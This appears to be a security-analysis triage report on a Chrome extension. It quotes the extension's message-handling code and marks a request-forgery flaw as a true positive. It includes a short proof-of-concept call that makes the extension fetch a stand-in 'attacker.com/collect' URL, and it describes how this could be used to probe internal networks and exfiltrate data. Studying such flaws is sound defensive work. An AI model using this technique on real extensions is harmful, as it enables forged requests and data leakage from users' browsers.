# CoCo Analysis: apomjoebmhkipmpoodjbhiibekmpjldd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/apomjoebmhkipmpoodjbhiibekmpjldd/opgen_generated_files/bg.js
Line 1035: if (request.notification_request_url) {

**Code:**

```javascript
// Background script (bg.js) - Lines 1027-1044
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (request) {
      if (request.message) {
        if (request.message == 'version') {
          sendResponse({version: kVersion});
        }
      }
      if (request.notification_request_url) {
        chrome.storage.local.set({
          notification_url: request.notification_request_url, // ← attacker-controlled URL stored
        });
        lookupNotification(); // Immediately triggers fetch with poisoned URL
      }
    }
    return true;
  }
);

// Lines 996-1023
function lookupNotification() {
  const notification_url_lookup = chrome.storage.local.get(['notification_url'],
    (lookup) => {
      fetch(lookup['notification_url'] + '&v=' + kVersion) // ← Fetch to attacker-controlled URL
      .then((resp) => resp.json())
      .then((resp) => {
        console.log('Looked up notification from ', lookup['notification_url']);
        const count = resp.count;
        if (count > 0) {
          chrome.action.setBadgeText({text: '' + count});
        } else {
          chrome.action.setBadgeText({text: ''});
        }
        const delay = resp.delay;
        if (lookupIntervalSeconds !== delay) {
          if (lookupIntervalId !== null) {
            clearInterval(lookupIntervalId);
          }
          lookupIntervalId = setInterval(lookupNotification, delay * 1000);
        }
      })
      .catch((error) => {
        console.log('Pinged ', lookup['notification_url']);
        console.log('Error:', error);
      });
    }
  );
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker website (must be in externally_connectable whitelist: marq.link domains)
// Per methodology Rule 1: Ignore manifest restrictions - if even ONE domain can exploit, it's TP
chrome.runtime.sendMessage(
  'apomjoebmhkipmpoodjbhiibekmpjldd', // Extension ID
  {
    notification_request_url: 'https://attacker.com/collect'
  }
);

// Extension will:
// 1. Store attacker's URL in chrome.storage.local
// 2. Immediately call lookupNotification()
// 3. Make privileged fetch() request to attacker.com/collect
// 4. Send extension version and potentially expose internal network access
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker controlling a whitelisted domain (marq.link, localhost:3000) can force the extension to make privileged cross-origin HTTP requests to arbitrary attacker-controlled URLs. The extension operates with elevated privileges and can access internal networks, authentication tokens, and bypass CORS restrictions. The attacker can probe internal services, exfiltrate data through the extension's network context, and potentially establish persistent polling to attacker infrastructure by setting custom delay intervals.
